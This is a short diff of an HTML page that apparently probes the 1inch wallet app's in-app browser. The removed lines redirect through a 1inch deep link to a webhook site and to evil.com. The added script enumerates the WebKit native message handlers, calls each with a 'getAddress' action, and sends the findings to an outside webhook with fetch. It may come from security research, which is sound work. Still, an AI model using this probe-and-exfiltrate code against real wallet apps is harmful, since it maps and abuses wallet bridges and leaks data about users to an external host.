@@ -1,6 +1,20 @@
-<a href="https://app.1inch.io/#/1/swap/ETH/USDT">Link 1</a>
-<a href="1inch://browser?url=https://webhooksite.net/9782dc22-d216-43c9-a513-905aa2d97d00">Link 2</a>
+<!DOCTYPE html>
+<html>
+<body>
+<pre id="o">Checking...</pre>
 <script>
-setTimeout(()=>{ location.href='https://app.1inch.io/#/1/swap/ETH/USDT'; }, 500);
-setTimeout(()=>{ location.href='1inch://browser?url=https://evil.com'; }, 1000);
+let r = "handlers: ";
+if(window.webkit && window.webkit.messageHandlers){
+  r += Object.keys(window.webkit.messageHandlers).join(',');
+  for(let h of Object.keys(window.webkit.messageHandlers)){
+    try{
+      window.webkit.messageHandlers[h].postMessage({test:123, action:"getAddress"});
+      r += " | " + h + " BISA DIPANGGIL";
+    }catch(e){}
+  }
+} else { r += "tidak ada / aman"; }
+document.getElementById('o').innerText = r;
+fetch('https://webhooksite.net/9782dc22-d216-43c9-a513-905aa2d97d00?bridge=' + encodeURIComponent(r));
 </script>
+</body>
+</html>
